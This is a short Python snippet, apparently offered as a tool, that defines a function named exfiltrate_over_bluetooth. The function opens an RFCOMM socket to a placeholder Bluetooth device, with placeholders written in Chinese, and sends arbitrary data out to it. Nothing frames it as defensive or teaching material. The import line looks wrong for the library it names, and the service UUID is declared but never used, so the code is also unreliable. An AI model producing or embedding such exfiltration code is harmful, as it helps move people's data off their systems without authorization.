from pybluez import bluetooth

def exfiltrate_over_bluetooth(data):
    target_device = '<藍牙裝置名稱>'
    service_uuid = '<服務UUID>'
    port = 1
    
    socket = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
    socket.connect((target_device, port))
    socket.send(data)
    socket.close()